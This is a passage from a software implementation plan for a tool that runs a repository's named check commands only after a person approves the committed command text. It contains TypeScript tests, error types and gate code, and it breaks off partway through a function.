4. In `supersedes`, change `const kept = !record.restored` to `const kept = true`, or in `freshness` change `if (record.restored)` to `if (false)`: `a fact a backup brought stands as unknown, and whatever this desk observed of the same question answers it` fails. Restore it.
5. In `RunningChecks.start`, key the run by name — `JSON.stringify([room, card, name])`: `a fact with nowhere recorded is unknown, and a check running for a card is listed even before it has a fact` fails on `{ name: 'verify' }` for `lint`. Restore it.
6. In `freshness`, pass `merged: true` for every fact: `only a merged pull request can be final; any other fact on a gone branch is unknown` fails. Restore it.
7. In `#nextStamp`, return `this.#now()`: `every window is told a room's evidence, whole, when it moves` fails — its clock is held still, and every read then takes the same stamp. Restore it.
3. The message test is a pin, so prove it observes: just before its last `evidence/board` read, append one check fact for card #1 with `new EvidenceStore(join(stateDir, 'evidence')).append(await canonical(repo.dir), 'evidence', [{ type: 'evidence', record: check({ id: 'm', at: await repo.git('rev-parse', 'HEAD'), cwd: repo.dir, observedAt: 1, board: room.id, card: 1 }) }])`. It fails on `board.cards`. Remove it. The rule that a message never moves a column is proven red in Task 18, where columns are derived.

- [ ] **Step 9: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/server/src/evidence/board.ts packages/protocol/src/evidence.ts packages/server/src/evidence/plane.ts packages/server/src/methods/evidence.ts packages/protocol/src/wire.ts packages/protocol/src/wire-validators.ts script/check-reachable.mjs packages/server/test/evidence-board.test.ts
git commit -m "feat(evidence): a board's evidence, each fact against its branch now

evidence/board reads a room's evidence: the latest fact of each kind per
card, each named check apart, each fresh, behind by so many commits,
rewritten since, uncommitted, final, or unknown with why — and the Seat that
produced it, in words. A fact from a backup stands as unknown, and one this
desk observed always answers first. Every read is stamped, strictly later
than the last, so a window keeps the newest. evidence/changed pushes it whole
when it moves. One check runs on a card at a time, whatever its name. A
message between agents puts nothing on a card: only what the desk observed
is evidence.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 11: Running a named check for a card

> **Security-critical: the one place a command a repository names runs outside a flow.** This task reads, compares and runs `.harnessdesk/checks.yml` commands. Its tests pin, each with a marker file the command would leave, that nothing runs before a person has approved the command; that what runs is the file as committed, and a file never committed runs nothing; that a changed, renamed or added command asks again, and so does an answer given for another generation of the file even when the command reads the same, and a command that changes and changes back; that an answer for text the file no longer holds runs nothing; that a check the file refuses cannot run whatever the answer says; that nothing runs in a checkout outside the project, or where only a backup says the card was; that one check runs on a card at a time, whatever its name, even renamed while it runs; that a quit caught half-way through admitting a check stops it before it starts and waits for it; and that the order of the rules holds — nothing is recorded as approved when an earlier rule refuses.

A card offers *Run verify*. The host holds the rules, in order, and nothing runs until every one has passed:

1. The check is read from the project's file **as committed** — one git blob, through `readChecks` alone — and its blob id is the file's generation.
2. It runs in the card's checkout — its holder's folder while claimed, else where this desk last observed a fact for it (never where a backup says), else the room's — and only if that folder is part of the project.
3. A person has approved the command on this machine, for this repository and this generation of its file (Task 8): the file is reconciled first, so any change drops every approval, and then either the command is approved, or the call is refused `checkUnseen` with the command and the generation as data. The person's answer is the same call with `seen` and `digest` set to exactly what they were shown; it is recorded and run only while the file is still exactly that.
4. One check runs on a card at a time, whatever its name, bound to the commit it starts at.

**Admission.** A call is admitted from its first line: a desk that is closing refuses it at once, and one that starts closing while a call is still checking the rules — each `await` is followed by a check — stops it before it can start anything. `stop()` marks the runner closing, aborts every call still being admitted and every run still running, and waits for all of them. The call answers once the check has started — a check can take twenty minutes — and the fact arrives by `evidence/changed`. A check the desk stops leaves no fact, since nothing was observed. No agent tool reaches this verb: the evidence verbs are the renderer's.

**Files:**
- Create: `packages/server/src/evidence/check-runs.ts`
- Modify: `packages/protocol/src/evidence.ts` (`CheckUnseen`), `packages/protocol/src/errors.ts` (`CheckUnseenError`, `isCheckUnseen`)
- Modify: `packages/server/src/evidence/plane.ts` (`checks`; `close` stops them)
- Modify: `packages/server/src/methods/evidence.ts`, `packages/protocol/src/wire.ts`, `packages/protocol/src/wire-validators.ts` (`evidence/check/run`), `script/check-reachable.mjs` (pin it)
- Test: `packages/server/test/evidence-check-runs.test.ts` (new)

**Proof needs:** neither

**Interfaces:**
- Consumes: `readChecks` and its `digest` (Task 7); `CommandsSeen`, `incarnationOf` (Task 8); `runCommand` (Task 9); `RunningChecks`, `EvidencePlane.announce` (Task 10); `revisionOf`, `projectOf` (Task 3); `SeatBook.latestKeptOf` (Task 4); `repositoryRoot` (`packages/server/src/worktree.ts`); `mintId` (Task 2).
- Produces: in `@harnessdesk/protocol`, `interface CheckUnseen { check: NamedCheck; previous: string | null; cwd: string; file: string; digest: string }`, `class CheckUnseenError extends Error { wireCode = 'checkUnseen'; wireData: CheckUnseen }`, `isCheckUnseen(error): boolean`. From `check-runs.ts`: `interface CheckRunsPort { board; cwdOf; changed(room); log }`, `interface CheckRunsParts`, `interface CheckAnswer { seen?: string; digest?: string }`, `class CheckRuns { run(room, card, name, answer?: CheckAnswer): Promise<{ started: true }>; stop(): Promise<void> }`. `EvidencePlane.checks: CheckRuns`. Wire: `'evidence/check/run': { params: { room: string; card: number; name: string; seen?: string; digest?: string }; result: { started: true } }`, refused with code `checkUnseen` and `data: CheckUnseen`.

- [ ] **Step 1: Write the failing tests**

Create `packages/server/test/evidence-check-runs.test.ts`. The look-alike letter is the escape `\u{430}`, never the character:

```ts
import assert from 'node:assert/strict'
import { access, mkdir, readFile, rm, writeFile } from 'node:fs/promises'
import { join } from 'node:path'
import { test } from 'node:test'

import {
  parseClientMessage,
  runtimeId,
  ValidationError,
  type CheckUnseen,
  type EvidenceRecord,
  type Intent,
  type TeamState,
} from '@harnessdesk/protocol'

import { EvidencePlane } from '../src/evidence/plane.js'
import { canonical } from '../src/evidence/revision.js'
import { evidenceDesk, makeRepo, until, type Repo } from './fixtures/evidence-desk.js'
import { tempDir } from './scratch.js'

/*
 * Security-critical. A command a repository names runs only after a person has
 * approved it, verbatim, on this machine, as its committed file says it; and a
 * changed, added or renamed command — or any change to the file — asks again.
 * Every test here that expects a refusal also proves nothing ran: each command
 * would leave a marker file outside the repository, and the marker is not
 * there.
 */

const exists = (path: string): Promise<boolean> =>
  access(path).then(
    () => true,
    () => false,
  )

const card = (id: number, over: Partial<Intent> = {}): Intent =>
  ({
    id,
    title: `Card ${id}`,
    detail: null,
    state: 'open',
    files: [],
    dependsOn: [],
    claim: null,
    createdAt: 1,
    updatedAt: 1,
    ...over,
  }) as Intent

interface Rig {
  readonly repo: Repo
  readonly plane: EvidencePlane
  readonly markers: string
  readonly seenFile: string
  /** Rewrites the checks file and commits it, so the tree stays clean. */
  checks(text: string): Promise<void>
  /** The check facts recorded for the room so far. */
  facts(): Promise<EvidenceRecord[]>
}

const rig = async (text: string, options: { cards?: readonly Intent[]; cwdOf?: (runtime: string, id: string) => string | null; root?: string } = {}): Promise<Rig> => {
  const repo = await makeRepo()
  const state = tempDir('hd-check-runs-state-')
  const markers = tempDir('hd-check-runs-markers-')
  const seenFile = join(state, 'commands-seen.json')
  const checks = async (next: string): Promise<void> => {
    await mkdir(join(repo.dir, '.harnessdesk'), { recursive: true })
    await writeFile(join(repo.dir, '.harnessdesk', 'checks.yml'), next.replaceAll('MARKERS', markers))
    await repo.git('add', '.')
    await repo.git('commit', '-q', '-m', 'checks')
  }
  await checks(text)
  const board = {
    id: 'room-1',
    root: options.root ?? repo.dir,
    intents: options.cards ?? [card(1)],
  } as unknown as TeamState
  const plane = new EvidencePlane(
    { dir: join(state, 'evidence'), seenFile },
    {
      board: (room) => (room === 'room-1' ? board : null),
      cwdOf: options.cwdOf ?? (() => null),
      push: () => {},
      log: () => {},
    },
  )
  // Only checks: a run announces the room, and the board read that follows may look at the card's diff.
  const facts = async (): Promise<EvidenceRecord[]> =>
    (await plane.store.read(await canonical(repo.dir), 'evidence')).lines.flatMap((line) =>
      line.type === 'evidence' && line.record.fact.kind === 'check' ? [line.record] : [],
    )
  return { repo, plane, markers, seenFile, checks, facts }
}

/** The refusal a check not yet approved gets, with what it carries. */
const unseen = async (attempt: Promise<unknown>): Promise<CheckUnseen> => {
  let carried: CheckUnseen | null = null
  await assert.rejects(attempt, (error: Error & { wireCode?: string; wireData?: CheckUnseen }) => {
    assert.equal(error.wireCode, 'checkUnseen')
    assert.match(error.message, /runs a command this machine has not approved as it is written now, so it has not run\.$/)
    carried = error.wireData ?? null
    return true
  })
  assert.ok(carried)
  return carried
}

/** The person's answer to a question: the command and the file, exactly as they were shown. */
const answer = (carried: CheckUnseen) => ({ seen: carried.check.run, digest: carried.digest })

/** The checks file's committed blob: the generation a question carries. */
const blob = (r: Rig): Promise<string> => r.repo.git('rev-parse', 'HEAD:.harnessdesk/checks.yml')

/** Waits for the room to have `count` check facts. */
const settled = (r: Rig, count: number): Promise<EvidenceRecord[]> =>
  until(async () => {
    const facts = await r.facts()
    return facts.length >= count && r.plane.running.of('room-1').length === 0 ? facts : null
  }, `${count} check fact(s)`)

test('nothing runs before a person has seen the command, and the refusal carries it verbatim', async () => {
  const r = await rig('verify: { run: touch MARKERS/verify, timeout: 30 }\n')
  const carried = await unseen(r.plane.checks.run('room-1', 1, 'verify'))
  assert.deepEqual(carried, {
    check: { name: 'verify', run: `touch ${r.markers}/verify`, timeout: 30 },
    previous: null,
    cwd: r.repo.dir,
    file: join(await canonical(r.repo.dir), '.harnessdesk', 'checks.yml'),
    digest: await blob(r),
  })
  assert.equal(await exists(join(r.markers, 'verify')), false, 'nothing ran')
  assert.equal(await exists(r.seenFile), false, 'and nothing was recorded as seen')
  assert.deepEqual(await r.facts(), [])
})

test('the answer runs exactly the command that was shown, once, and the fact it leaves names it', async () => {
  const r = await rig('verify: { run: touch MARKERS/verify, timeout: 30 }\n')
  const carried = await unseen(r.plane.checks.run('room-1', 1, 'verify'))
  assert.deepEqual(await r.plane.checks.run('room-1', 1, 'verify', answer(carried)), { started: true })
  const [fact] = await settled(r, 1)
  assert.equal(await exists(join(r.markers, 'verify')), true)
  assert.deepEqual(fact?.fact, {
    kind: 'check',
    name: 'verify',
    run: `touch ${r.markers}/verify`,
    exit: 0,
    timedOut: false,
    at: await r.repo.git('rev-parse', 'HEAD'),
    dirty: false,
    tail: '',
  })
  assert.deepEqual(fact?.card, { board: 'room-1', id: 1 })
  assert.deepEqual(fact?.checkout, { cwd: r.repo.dir, branch: 'main' })
  // Approved now: the next run does not ask.
  await r.plane.checks.run('room-1', 1, 'verify')
  await settled(r, 2)
})

test('what runs is the file as committed: a change in the working copy is not run, and not asked about', async () => {
  const r = await rig('verify: { run: touch MARKERS/committed }\n')
  await writeFile(join(r.repo.dir, '.harnessdesk', 'checks.yml'), `verify: { run: touch ${r.markers}/working }\n`)
  const carried = await unseen(r.plane.checks.run('room-1', 1, 'verify'))
  assert.equal(carried.check.run, `touch ${r.markers}/committed`)
  await r.plane.checks.run('room-1', 1, 'verify', answer(carried))
  const [fact] = await settled(r, 1)
  assert.equal(await exists(join(r.markers, 'committed')), true)
  assert.equal(await exists(join(r.markers, 'working')), false)
  assert.equal(fact?.fact.kind === 'check' && fact.fact.dirty, true, 'and the fact says the tree held changes')
})

test('a file never committed offers nothing to run', async () => {
  const r = await rig('verify: { run: touch MARKERS/verify }\n')
  await r.repo.git('rm', '-q', '--cached', '.harnessdesk/checks.yml')
  await r.repo.git('commit', '-q', '-m', 'untrack the checks')
  await assert.rejects(
    r.plane.checks.run('room-1', 1, 'verify', { seen: `touch ${r.markers}/verify`, digest: 'anything' }),
    /^Error: verify cannot run: It is not committed yet\./,
  )
  assert.equal(await exists(join(r.markers, 'verify')), false)
})

test('a changed command asks again, says what it was, and runs nothing', async () => {
  const r = await rig('verify: { run: touch MARKERS/first }\n')
  await r.plane.checks.run('room-1', 1, 'verify', answer(await unseen(r.plane.checks.run('room-1', 1, 'verify'))))
  await settled(r, 1)
  await r.checks('verify: { run: touch MARKERS/second }\n')
  const carried = await unseen(r.plane.checks.run('room-1', 1, 'verify'))
  assert.equal(carried.check.run, `touch ${r.markers}/second`)
  assert.equal(carried.previous, `touch ${r.markers}/first`)
  assert.equal(await exists(join(r.markers, 'second')), false)
})

test('a renamed check asks again, and so does one just added', async () => {
  const r = await rig('verify: { run: touch MARKERS/verify }\n')
  await r.plane.checks.run('room-1', 1, 'verify', answer(await unseen(r.plane.checks.run('room-1', 1, 'verify'))))
  await settled(r, 1)
  await r.checks('renamed: { run: touch MARKERS/verify }\nadded: { run: touch MARKERS/added }\n')
  const renamed = await unseen(r.plane.checks.run('room-1', 1, 'renamed', undefined))
  assert.equal(renamed.previous, null, 'a new name has nothing before it')
  await unseen(r.plane.checks.run('room-1', 1, 'added', undefined))
  assert.equal(await exists(join(r.markers, 'added')), false)
  assert.equal((await r.facts()).length, 1, 'only the run the person answered for')
})

test('an answer for text the file no longer holds runs nothing, and asks about what it holds now', async () => {
  const r = await rig('verify: { run: touch MARKERS/shown }\n')
  const shown = await unseen(r.plane.checks.run('room-1', 1, 'verify'))
  // Between the question and the answer, the file changes under it.
  await r.checks('verify: { run: touch MARKERS/swapped }\n')
  const again = await unseen(r.plane.checks.run('room-1', 1, 'verify', answer(shown)))
  assert.equal(again.check.run, `touch ${r.markers}/swapped`)
  assert.equal(await exists(join(r.markers, 'shown')), false)
  assert.equal(await exists(join(r.markers, 'swapped')), false)
  assert.equal(await exists(r.seenFile), false, 'the stale answer was not recorded')
})

test('an answer given for another generation of the file asks again, even when the command reads the same', async () => {
  const r = await rig('verify: { run: touch MARKERS/verify }\n')
  const shown = await unseen(r.plane.checks.run('room-1', 1, 'verify'))
  // Something else in the file changes between the question and the answer.
  await r.checks('verify: { run: touch MARKERS/verify }\nlint: { run: touch MARKERS/lint }\n')
  const again = await unseen(r.plane.checks.run('room-1', 1, 'verify', answer(shown)))
  assert.equal(again.check.run, shown.check.run)
  assert.notEqual(again.digest, shown.digest)
  assert.equal(await exists(join(r.markers, 'verify')), false)
})

test('an approval does not outlive the file it was given for: a command that changes and changes back asks again', async () => {
  const r = await rig('verify: { run: touch MARKERS/a }\n')
  await r.plane.checks.run('room-1', 1, 'verify', answer(await unseen(r.plane.checks.run('room-1', 1, 'verify'))))
  await settled(r, 1)
  await r.checks('verify: { run: touch MARKERS/b }\n')
  await unseen(r.plane.checks.run('room-1', 1, 'verify'))
  await r.checks('verify: { run: touch MARKERS/a }\n')
  const back = await unseen(r.plane.checks.run('room-1', 1, 'verify'))
  // Asked again, as a command it ran before: the answer it had then went with the file it was given for.
  assert.equal(back.check.run, `touch ${r.markers}/a`)
  assert.equal(back.previous, null)
  assert.equal((await r.facts()).length, 1)
})

test('a check the file refuses cannot run, whatever the answer says', async () => {
  const lookalike = 'touch MARKERS/ex\u{430}mple'
  const r = await rig(`verify: { run: ${lookalike} }\n`)
  await assert.rejects(
    r.plane.checks.run('room-1', 1, 'verify', { seen: lookalike.replace('MARKERS', r.markers), digest: await blob(r) }),
    /^Error: verify cannot run: The command holds a character that is not plain printable ASCII/,
  )
  assert.deepEqual(await r.facts(), [])
})

test("a card held in a checkout that is not part of the project runs nothing there", async () => {
  const elsewhere = await makeRepo('hd-check-runs-elsewhere-')
  const r = await rig('verify: { run: touch MARKERS/verify }\n', {
    cards: [card(1, { state: 'claimed', claim: { runtime: runtimeId('fake'), sessionId: 's1', at: 1 } })],
    cwdOf: () => elsewhere.dir,
  })
  await assert.rejects(
    r.plane.checks.run('room-1', 1, 'verify', { seen: `touch ${r.markers}/verify`, digest: await blob(r) }),
    /^Error: #1's checkout, .+, is not part of this project, so its check does not run there\.$/,
  )
  assert.equal(await exists(join(r.markers, 'verify')), false)
  assert.equal(await exists(r.seenFile), false, 'refused before anything was recorded as seen')
})

test('a fact a backup brought never says where a check runs', async () => {
  const r = await rig('where: { run: pwd > MARKERS/where }\n')
  const inside = join(r.repo.dir, 'sub')
  await mkdir(inside)
  const at = await r.repo.git('rev-parse', 'HEAD')
  await r.plane.store.append(await canonical(r.repo.dir), 'evidence', [
    {
      type: 'evidence',
      record: {
        id: 'brought',
        fact: { kind: 'diff', files: 1, added: 1, removed: 0, from: at, to: at },
        card: { board: 'room-1', id: 1 },
        checkout: { cwd: inside, branch: 'main' },
        observedAt: 1,
        restored: { at: 1 },
      },
    },
  ])
  await r.plane.checks.run('room-1', 1, 'where', answer(await unseen(r.plane.checks.run('room-1', 1, 'where'))))
  await settled(r, 1)
  assert.equal((await readFile(join(r.markers, 'where'), 'utf8')).trim(), await canonical(r.repo.dir))
})

test('a room in no repository runs no check, since a check is bound to a commit', async () => {
  const r = await rig('verify: { run: touch MARKERS/verify }\n', { root: tempDir('hd-check-runs-plain-') })
  await assert.rejects(r.plane.checks.run('room-1', 1, 'verify'), /is in no git repository, so no check runs here\.$/)
})

test('one check on a card at a time, whatever its name — even renamed while it runs — and a quit stops it without leaving a fact', async () => {
  const r = await rig('slow: { run: sleep 20 && touch MARKERS/slow }\nquick: { run: touch MARKERS/quick }\n', {
    cards: [card(1), card(2)],
  })
  const ask = await unseen(r.plane.checks.run('room-1', 1, 'slow'))
  await r.plane.checks.run('room-1', 1, 'slow', answer(ask))
  await assert.rejects(r.plane.checks.run('room-1', 1, 'slow'), /^Error: slow is running on #1, and one check runs on a card at a time\.$/)
  // Another check on the same card, approved and all, waits its turn too: they would share one checkout.
  const quick = await unseen(r.plane.checks.run('room-1', 1, 'quick'))
  await assert.rejects(r.plane.checks.run('room-1', 1, 'quick', answer(quick)), /^Error: slow is running on #1, /)
  // Renamed while it runs: the new name is the same checkout, so it waits as well.
  await r.checks('slower: { run: sleep 20 && touch MARKERS/slow }\nquick: { run: touch MARKERS/quick }\n')
  const renamed = await unseen(r.plane.checks.run('room-1', 1, 'slower'))
  await assert.rejects(r.plane.checks.run('room-1', 1, 'slower', answer(renamed)), /^Error: slow is running on #1, /)
  // Another card is another checkout's turn.
  await r.plane.checks.run('room-1', 2, 'quick', answer(await unseen(r.plane.checks.run('room-1', 2, 'quick'))))
  await until(async () => ((await exists(join(r.markers, 'quick'))) ? true : null), 'the other card\'s check')

  await r.plane.close()
  assert.deepEqual(r.plane.running.of('room-1'), [])
  assert.deepEqual(
    (await r.facts()).map((fact) => [fact.card?.id, fact.fact.kind === 'check' ? fact.fact.name : '']),
    [[2, 'quick']],
    'the slow one was stopped by the quit: nothing was observed',
  )
  assert.equal(await exists(join(r.markers, 'slow')), false)
})

test('a quit that begins while a check is still being admitted stops it before it starts, and waits for it', async () => {
  const r = await rig('verify: { run: touch MARKERS/verify }\n')
  await r.plane.checks.run('room-1', 1, 'verify', answer(await unseen(r.plane.checks.run('room-1', 1, 'verify'))))
  await settled(r, 1)
  await rm(join(r.markers, 'verify'))

  // Hold the next call inside its admission, where it asks whether the command is approved.
  let release!: () => void
  const gate = new Promise<void>((resolve) => {
    release = resolve
  })
  let entered!: () => void
  const inside = new Promise<void>((resolve) => {
    entered = resolve
  })
  const approved = r.plane.seen.approved.bind(r.plane.seen)
  r.plane.seen.approved = async (...args) => {
    entered()
    await gate
    return approved(...args)
  }
  const admitting = r.plane.checks.run('room-1', 1, 'verify')
  await inside

  let closed = false
  const closing = r.plane.close().then(() => {
    closed = true
  })
  await new Promise((resolve) => setTimeout(resolve, 100))
  assert.equal(closed, false, 'the quit waits for the call it caught half-way')
  // Anything asked from now on is refused at once — not held, as the caught call is.
  const late = r.plane.checks.run('room-1', 1, 'verify')
  const waited = new Promise((_, reject) => setTimeout(() => reject(new Error('it was held, not refused')), 1_000))
  await assert.rejects(Promise.race([late, waited]), /^Error: The desk is closing, so no check starts now\.$/)

  release()
  await assert.rejects(admitting, /^Error: The desk is closing, so no check starts now\.$/)
  await closing
  assert.equal(await exists(join(r.markers, 'verify')), false, 'nothing started')
  assert.deepEqual(r.plane.running.of('room-1'), [])
  assert.equal((await r.facts()).length, 1)
})

test('through the host: the refusal reaches the caller with its code and the command, and the wire holds the shape', async (t) => {
  const { host, repo } = await evidenceDesk(t)
  await mkdir(join(repo.dir, '.harnessdesk'))
  await writeFile(join(repo.dir, '.harnessdesk', 'checks.yml'), 'verify: { run: pnpm verify }\n')
  await repo.git('add', '.')
  await repo.git('commit', '-q', '-m', 'checks')
  const room = (await host.call('team/room/create', { root: repo.dir, name: 'Checks' })) as TeamState
  await host.call('team/add', { room: room.id, title: 'Fix the build' })
  await unseen(host.call('evidence/check/run', { room: room.id, card: 1, name: 'verify' }))

  const refused = [
    { room: room.id, card: 1, name: '' },
    { room: '', card: 1, name: 'verify' },
    { room: room.id, card: '1', name: 'verify' },
    { room: room.id, card: 1, name: 'verify', seen: 42 },
    { room: room.id, card: 1, name: 'verify', seen: 'pnpm verify', digest: 7 },
  ]
  for (const params of refused) {
    assert.throws(() => parseClientMessage({ id: 1, method: 'evidence/check/run', params }), ValidationError)
  }
})
```

- [ ] **Step 2: Run them to see them fail**

Run: `pnpm run build:node`
Expected: FAIL — `Module '"@harnessdesk/protocol"' has no exported member 'CheckUnseen'`, and `Property 'checks' does not exist on type 'EvidencePlane'`.

- [ ] **Step 3: The refusal, in the protocol**

1. Append to `packages/protocol/src/evidence.ts`:

```ts
/**
 * What a check refused as unseen carries, for the surface that asks: the
 * command exactly as it would run, what this machine last approved under the
 * same name when it was something else, where it would run, and the file it is
 * in.
 */
export interface CheckUnseen {
  readonly check: NamedCheck
  readonly previous: string | null
  readonly cwd: string
  readonly file: string
  /** The checks file as it was read for this question: the answer runs only while it is still exactly this. */
  readonly digest: string
}
```

2. In `packages/protocol/src/errors.ts`, add `import type { CheckUnseen } from './evidence.js'` after `import type { SeatCandidate } from './agent.js'`, and append:

```ts

/**
 * A project's check has not been approved, as its file is now, by a person on
 * this machine — so nothing ran. `wireData` carries the command verbatim, and
 * the file's generation, for the surface to show and ask about. The person's
 * answer is the same call with `seen` and `digest` set to exactly what they
 * were shown, which runs only while the file is still that.
 */
export class CheckUnseenError extends Error {
  readonly wireCode = 'checkUnseen'
  constructor(
    message: string,
    readonly wireData: CheckUnseen,
  ) {
    super(message)
    this.name = 'CheckUnseenError'
  }
}

/** Host-side, like `isSeatRefused`: a renderer reads `error.code === 'checkUnseen'`. */
export const isCheckUnseen = (error: unknown): boolean => wireCodeOf(error) === 'checkUnseen'
```

The server's error path already sends `wireDataOf(error)` as the reply's `data` (`packages/server/src/server.ts`), as it does for `SeatRefusedError`; nothing there changes.

- [ ] **Step 4: The gate**

Create `packages/server/src/evidence/check-runs.ts`:

```ts
import { CheckUnseenError, type EvidenceRecord, type Intent, type NamedCheck, type TeamState } from '@harnessdesk/protocol'

import { repositoryRoot } from '../worktree.js'
import type { RunningChecks } from './board.js'
import { readChecks } from './checks-file.js'
import { mintId } from './records.js'
import { projectOf, revisionOf, type Revision } from './revision.js'
import { runCommand } from './run.js'
import type { SeatBook } from './seats.js'
import { incarnationOf, type CommandsSeen } from './seen.js'
import type { EvidenceStore } from './store.js'

/**
 * Runs a project's named check for a card, and records what it observed.
 *
 * **Security-critical: this is the one place a command a repository names is
 * run outside a flow.** The rules, in the order they are checked, and nothing
 * runs until every one has passed:
 *
 * 1. The check is read from `.harnessdesk/checks.yml` as committed at the
 *    project's `HEAD` — one git blob, through `readChecks` and nowhere else. A
 *    check that file refuses — a command that is not plain printable ASCII, a
 *    key a check cannot say — cannot run, whatever the caller says.
 * 2. It runs in the card's checkout: its holder's folder while it is claimed,
 *    else the folder its latest fact was observed in, else the room's. That
 *    folder must belong to the same project, or nothing runs.
 * 3. A person has approved the command on this machine, for this repository
 *    and this generation of its checks file (`seen.ts`). Until then — and again
 *    whenever the file changes in any way, the check is renamed, or it is new —
 *    the call is refused with `CheckUnseenError`, carrying the command as it
 *    would run and the file's generation, and nothing runs. The person's answer
 *    is the same call with `seen` and `digest` set to the text and the
 *    generation they were shown; it is recorded and run only while the file is
 *    still exactly that, so a file that changed between the question and the
 *    answer asks again.
 * 4. One check runs on a card at a time, whatever its name, bound to the commit
 *    it started at.
 *
 * It runs with the person's own authority and a small environment of its own
 * (`run.ts`); the question that approves it says so.
 *
 * **Admission.** A call is admitted from its first line: a desk that is
 * closing refuses it at once, and one that starts closing while a call is
 * still checking the rules stops it before it can start anything. `stop()`
 * waits for every call still being admitted and every run still running. A
 * check the desk stops leaves no fact: nothing was observed.
 *
 * The run itself is not awaited by the caller: a check can take twenty
 * minutes. The fact it leaves arrives as the room's evidence
 * (`evidence/changed`).
 */

/** Why a call made while the desk is closing starts nothing. */
const CLOSING = 'The desk is closing, so no check starts now.'

export interface CheckRunsPort {
  board(room: string): TeamState | null
  cwdOf(runtime: string, sessionId: string): string | null
  /** The room's evidence moved: a run started, or one ended and left a fact. */
  changed(room: string): void
  log(message: string, details?: Readonly<Record<string, unknown>>): void
}

export interface CheckRunsParts {
  readonly store: EvidenceStore
  readonly seen: CommandsSeen
  readonly seats: SeatBook
  readonly running: RunningChecks
  readonly port: CheckRunsPort
  readonly now?: () => number
}

/** A person's answer to the question a check asks: the command, and the file, exactly as they were shown. */
export interface CheckAnswer {
  readonly seen?: string | undefined
  readonly digest?: string | undefined
}

/** One call, from its first line until it has refused or the run it started has ended. */
interface Active {
  readonly stop: AbortController
  readonly settled: Promise<void>
}

export class CheckRuns {
  readonly #parts: CheckRunsParts
  readonly #now: () => number
  #closing = false
  readonly #active = new Set<Active>()

  constructor(parts: CheckRunsParts) {
    this.#parts = parts
    this.#now = parts.now ?? Date.now
  }

  /** Runs a card's named check, or refuses with why — and answers once it has started. */
  run(room: string, card: number, name: string, answer: CheckAnswer = {}): Promise<{ readonly started: true }> {
    if (this.#closing) return Promise.reject(new Error(CLOSING))
    const stop = new AbortController()
    let running: Promise<void> = Promise.resolve()
    const admitting = this.#admit(room, card, name, answer, stop.signal, (run) => {
      running = run
    })
    const active: Active = {
      stop,
      settled: admitting.then(
        () => running,
        () => undefined,
      ),
    }
    this.#active.add(active)
    void active.settled.finally(() => this.#active.delete(active))
    return admitting.then(() => ({ started: true }) as const)
  }

  /**
   * The desk is closing: nothing new is admitted, every call still checking
   * the rules is stopped before it can start anything, every running check is
   * stopped with its process group, and this waits for all of them.
   */
  async stop(): Promise<void> {
    this.#closing = true
    for (const active of this.#active) active.stop.abort()
    await Promise.allSettled([...this.#active].map((active) => active.settled))
  }

  async #admit(
    room: string,
    card: number,
    name: string,
    answer: CheckAnswer,
    signal: AbortSignal,
    started: (running: Promise<void>) => void,
  ): Promise<void> {
    const { port, seen } = this.#parts
    const still = (): void => {
      if (signal.aborted) throw new Error(CLOSING)
    }
    const board = port.board(room)
    if (!board) throw new Error(`There is no room ${room} on this desk.`)
    const intent = board.intents.find((one) => one.id === card)
    if (!intent) throw new Error(`There is no card #${card} on this board.`)
    const folder = board.cwd ?? board.root
    const project = await repositoryRoot(folder)
    still()
    if (project === null) {
      throw new Error(`A check is bound to a commit, and ${folder} is in no git repository, so no check runs here.`)
    }

    // 1. The check, read from the project's own file as committed, as strictly as it is shown.
    const read = await readChecks(project)
    still()
    const check = read.checks.find((one) => one.name === name)
    if (!check || read.digest === null) {
      const problem = read.problems.find((one) => one.at === '' || one.check === name)
      throw new Error(problem ? `${name} cannot run: ${problem.text}` : `${read.file} names no check called “${name}”.`)
    }

    // 2. Where it would run, held to the project.
    const cwd = await this.#checkoutFor(board, intent, project)
    still()

    // 3. Approved on this machine, for this repository and this file — or asked, and nothing runs.
    const scope = { project, incarnation: await incarnationOf(project), digest: read.digest }
    await seen.reconcile(
      scope,
      read.checks.map((one) => one.name),
    )
    still()
    if (!(await seen.approved(scope, check))) {
      if (answer.seen !== check.run || answer.digest !== read.digest) {
        throw new CheckUnseenError(
          `${check.name} runs a command this machine has not approved as it is written now, so it has not run.`,
          { check, previous: await seen.previous(scope, check.name, check.run), cwd, file: read.file, digest: read.digest },
        )
      }
      still()
      await seen.approve(scope, check)
    }
    still()

    // 4. Bound to the commit it starts at, and alone on its card.
    const revision = await revisionOf(cwd)
    still()
    if (!revision) throw new Error(`${cwd} has no commit yet, and a check is bound to one, so it has not run.`)
    const busy = this.#parts.running.start(room, card, check.name, this.#now())
    if (busy) throw new Error(`${busy.name} is running on #${card}, and one check runs on a card at a time.`)
    const seat =
      intent.state === 'claimed' && intent.claim
        ? (this.#parts.seats.latestKeptOf(intent.claim.runtime, intent.claim.sessionId)?.id ?? null)
        : null
    port.changed(room)
    started(
      this.#execute({ room, card, check, cwd, revision, seat, project, signal }).finally(() => {
        this.#parts.running.end(room, card)
        port.changed(room)
      }),
    )
  }

  /** The folder a card's check runs in, or a refusal naming it when it is not part of the project. */
  async #checkoutFor(board: TeamState, intent: Intent, project: string): Promise<string> {
    const holder =
      intent.state === 'claimed' && intent.claim ? this.#parts.port.cwdOf(intent.claim.runtime, intent.claim.sessionId) : null
    const cwd = holder ?? (await this.#lastCheckout(project, board.id, intent.id)) ?? board.cwd ?? board.root
    if ((await projectOf(cwd)) !== project) {
      throw new Error(`#${intent.id}'s checkout, ${cwd}, is not part of this project, so its check does not run there.`)
    }
    return cwd
  }

  /** The folder the card's latest fact was observed in — by this desk: a backup never says where a check runs. */
  async #lastCheckout(project: string, room: string, card: number): Promise<string | null> {
    const { lines } = await this.#parts.store.read(project, 'evidence')
    for (const line of [...lines].reverse()) {
      if (line.type !== 'evidence' || line.record.restored || line.record.card?.board !== room || line.record.card.id !== card) continue
      if (line.record.checkout) return line.record.checkout.cwd
    }
    return null
  }

  async #execute(run: {
    readonly room: string
    readonly card: number
    readonly check: NamedCheck
    readonly cwd: string
    readonly revision: Revision
    readonly seat: string | null
    readonly project: string
    readonly signal: AbortSignal
  }): Promise<void> {
    const result = await runCommand(run.check.run, { cwd: run.cwd, timeoutSec: run.check.timeout, signal: run.signal })
    if (run.signal.aborted) {
